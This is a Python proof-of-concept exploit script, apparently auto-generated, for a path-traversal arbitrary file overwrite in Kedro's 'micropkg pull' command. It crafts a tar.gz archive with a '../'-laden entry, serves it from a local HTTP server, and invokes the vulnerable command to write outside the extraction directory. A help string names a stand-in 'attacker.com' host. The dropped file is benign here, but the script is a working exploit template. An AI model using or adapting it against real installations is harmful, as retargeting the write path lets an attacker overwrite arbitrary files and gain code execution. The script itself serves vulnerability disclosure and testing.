#!/usr/bin/env python3
# PoC for kedro (/home/xcy/.local/lib/python3.14/site-packages/kedro)
# Path: suspicious-006
# Sink: _is_relative_path
# Auto-generated — run with: python3 afo_cli_manifest_passed_unpack__is_relative_path.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: Kedro micropkg pull - Arbitrary File Overwrite via Path Traversal

Vulnerability: The `_unpack_sdist` function in Kedro's micropkg CLI extracts tar archives
using `safe_extract` without validating entry paths for path traversal. An attacker can
craft a malicious .tar.gz archive containing entries with '../' in their names, causing
files to be written outside the intended destination directory.

This PoC demonstrates the vulnerability by creating a malicious archive that writes a
benign file to /tmp/poc_success.txt when extracted by Kedro's `micropkg pull` command.

Usage:
    python3 poc_kedro_afo.py [--target TARGET_URL]

    If --target is provided, the script will attempt to serve the malicious archive
    via a local HTTP server and trigger the vulnerable code path.
    If omitted, it will create the malicious archive and print instructions.
"""

import argparse
import io
import os
import shutil
import subprocess
import sys
import tarfile
import tempfile
import time
import threading
from http.server import HTTPServer, SimpleHTTPRequestHandler
from pathlib import Path

# Configuration
MALICIOUS_ARCHIVE_NAME = "malicious_package-1.0.0.tar.gz"
BENIGN_PAYLOAD_FILE = "/tmp/poc_success.txt"
BENIGN_PAYLOAD_CONTENT = "Kedro AFO PoC - Path traversal successful!\n"
LOCAL_SERVER_PORT = 9999


def create_malicious_archive(output_path: str) -> str:
    """
    Create a malicious .tar.gz archive with path traversal entries.
    
    The archive contains:
    - A normal package directory (to pass Kedro's validation)
    - A file with '../' in its path that will be extracted outside the destination
    
    Returns the path to the created archive.
    """
    print(f"[*] Creating malicious archive: {output_path}")
    
    # Create a temporary directory to build the archive contents
    with tempfile.TemporaryDirectory() as tmpdir:
        tmpdir_path = Path(tmpdir)
        
        # Create a normal package structure that Kedro expects
        # Kedro expects exactly one directory in the extracted sdist
        package_dir = tmpdir_path / "my_package-1.0.0"
        package_dir.mkdir()
        
        # Create the actual Python package inside
        pkg_subdir = package_dir / "my_package"
        pkg_subdir.mkdir()
        (pkg_subdir / "__init__.py").write_text("# Package init\n")
        
        # Create a METADATA file so Kedro can parse it
        metadata_dir = package_dir / "my_package-1.0.0.dist-info"
        metadata_dir.mkdir()
        (metadata_dir / "METADATA").write_text(
            "Metadata-Version: 2.1\n"
            "Name: my-package\n"
            "Version: 1.0.0\n"
        )
        
        # Create the malicious entry - this will write outside the destination
        # The path traversal goes up from the extraction directory to /tmp
        malicious_entry_path = "../../../../../../../../tmp/poc_success.txt"
        
        # Create the tar archive with the malicious entry
        archive_path = Path(output_path)
        with tarfile.open(archive_path, "w:gz") as tar:
            # Add the normal package directory
            tar.add(package_dir, arcname=package_dir.name)
            
            # Add the malicious entry with path traversal
            info = tarfile.TarInfo(name=malicious_entry_path)
            info.size = len(BENIGN_PAYLOAD_CONTENT)
            info.type = tarfile.REGTYPE
            tar.addfile(info, io.BytesIO(BENIGN_PAYLOAD_CONTENT.encode()))
            
            print(f"[*] Added malicious entry: {malicious_entry_path}")
            print(f"[*] Entry will write to: /tmp/poc_success.txt")
    
    return str(archive_path)


def serve_malicious_archive(archive_path: str, port: int):
    """
    Start a simple HTTP server to serve the malicious archive.
    This simulates a remote package source that Kedro would download from.
    """
    archive_dir = os.path.dirname(os.path.abspath(archive_path))
    os.chdir(archive_dir)
    
    handler = SimpleHTTPRequestHandler
    
    httpd = HTTPServer(("0.0.0.0", port), handler)
    print(f"[*] Serving malicious archive on http://0.0.0.0:{port}/")
    print(f"[*] Archive URL: http://localhost:{port}/{os.path.basename(archive_path)}")
    print("[*] Press Ctrl+C to stop the server")
    
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Server stopped.")
        httpd.shutdown()


def trigger_vulnerability(archive_url: str):
    """
    Trigger the vulnerable code path by running `kedro micropkg pull` with the
    malicious archive URL.
    
    This simulates an attacker providing a malicious package path to the CLI.
    """
    print(f"[*] Attempting to trigger vulnerability with URL: {archive_url}")
    print("[*] Running: kedro micropkg pull --package-path <archive_url>")
    
    # We need to be in a Kedro project directory for this to work
    # If not in a Kedro project, the command will fail but the extraction
    # might still happen before the project validation
    try:
        result = subprocess.run(
            [sys.executable, "-m", "kedro", "micropkg", "pull", "--package-path", archive_url],
            capture_output=True,
            text=True,
            timeout=30
        )
        print(f"[*] Command stdout:\n{result.stdout}")
        print(f"[*] Command stderr:\n{result.stderr}")
        print(f"[*] Return code: {result.returncode}")
    except subprocess.TimeoutExpired:
        print("[!] Command timed out")
    except FileNotFoundError:
        print("[!] kedro command not found. Make sure kedro is installed.")
    except Exception as e:
        print(f"[!] Error running kedro command: {e}")


def check_exploit_success():
    """Check if the benign payload file was created."""
    payload_path = Path(BENIGN_PAYLOAD_FILE)
    if payload_path.exists():
        print(f"[+] SUCCESS! Payload file created at: {BENIGN_PAYLOAD_FILE}")
        print(f"[+] Content: {payload_path.read_text()}")
        # Clean up
        payload_path.unlink()
        print("[*] Cleaned up payload file.")
        return True
    else:
        print(f"[-] Payload file not found at: {BENIGN_PAYLOAD_FILE}")
        print("[*] The vulnerability may not have been triggered.")
        return False


def main():
    parser = argparse.ArgumentParser(
        description="PoC for Kedro micropkg pull Arbitrary File Overwrite"
    )
    parser.add_argument(
        "--target",
        help="URL to serve the malicious archive (e.g., http://attacker.com/malicious.tar.gz)",
        default=None
    )
    parser.add_argument(
        "--serve-only",
        action="store_true",
        help="Only serve the malicious archive, don't trigger the vulnerability"
    )
    parser.add_argument(
        "--port",
        type=int,
        default=LOCAL_SERVER_PORT,
        help=f"Port for local HTTP server (default: {LOCAL_SERVER_PORT})"
    )
    
    args = parser.parse_args()
    
    # Create the malicious archive
    archive_path = create_malicious_archive(MALICIOUS_ARCHIVE_NAME)
    print(f"[*] Malicious archive created at: {archive_path}")
    
    if args.serve_only:
        # Just serve the archive, don't trigger
        serve_malicious_archive(archive_path, args.port)
        return
    
    if args.target:
        # Use the provided target URL
        print(f"[*] Using target URL: {args.target}")
        trigger_vulnerability(args.target)
        check_exploit_success()
    else:
        # Start a local server and trigger the vulnerability
        print(f"[*] Starting local HTTP server on port {args.port}...")
        
        # Start server in a separate thread
        server_thread = threading.Thread(
            target=serve_malicious_archive,
            args=(archive_path, args.port),
            daemon=True
        )
        server_thread.start()
        
        # Give the server a moment to start
        time.sleep(1)
        
        # Trigger the vulnerability
        archive_url = f"http://localhost:{args.port}/{MALICIOUS_ARCHIVE_NAME}"
        trigger_vulnerability(archive_url)
        
        # Check if the exploit worked
        check_exploit_success()
        
        print("\n[*] Note: The server is still running in the background.")
        print("[*] You can manually test with:")
        print(f"    kedro micropkg pull --package-path {archive_url}")


if __name__ == "__main__":
    print("=" * 60)
    print("Kedro micropkg pull - Arbitrary File Overwrite PoC")
    print("=" * 60)
    print()
    
    # Check if we're in a Kedro project (optional, for better testing)
    if not Path("pyproject.toml").exists():
        print("[!] Warning: Not in a Kedro project directory.")
        print("[!] The `kedro micropkg pull` command may fail.")
        print("[!] For full testing, run this from a Kedro project.")
        print()
    
    main()
